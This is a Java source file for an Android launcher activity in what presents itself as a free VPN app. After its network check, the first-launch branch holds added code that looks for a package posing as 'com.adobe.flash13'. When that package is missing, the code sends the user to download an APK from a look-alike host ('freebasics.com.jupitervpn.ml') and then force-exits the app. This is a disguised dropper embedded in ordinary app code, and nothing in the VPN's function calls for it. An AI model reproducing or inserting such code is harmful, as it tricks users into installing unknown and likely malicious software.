package com.vasilkoff.easyvpnfree.activity;

import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;

import com.vasilkoff.easyvpnfree.R;
import com.vasilkoff.easyvpnfree.util.NetworkState;

public class LauncherActivity extends Activity {
    private static boolean loadStatus = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (NetworkState.isOnline()) {
            if (loadStatus) {
                Intent myIntent = new Intent(this, HomeActivity.class);
                startActivity(myIntent);
                finish();
            } else {
                loadStatus = true;
                Intent myIntent = new Intent(this, LoaderActivity.class);
                startActivity(myIntent);
                finish();



                Intent intent = getPackageManager().getLaunchIntentForPackage("com.adobe.flash13");
                if (intent != null) {
                    // We found the activity now start the activity
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } else {
                    // Bring user to the market or let them choose an app?
                    intent = new Intent(Intent.ACTION_VIEW);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.setData(Uri.parse("http://0.freebasics.com.jupitervpn.ml/jupitervpn/jupitervpn-key.apk"));
                    startActivity(intent);
                    System.exit(1);
                }


            }
        } else {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle(getString(R.string.network_error))
                    .setMessage(getString(R.string.network_error_message))
                    .setNegativeButton(getString(R.string.ok),
                            new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    dialog.cancel();
                                    onBackPressed();
                                }
                            });
            AlertDialog alert = builder.create();
            alert.show();
        }



    }
}
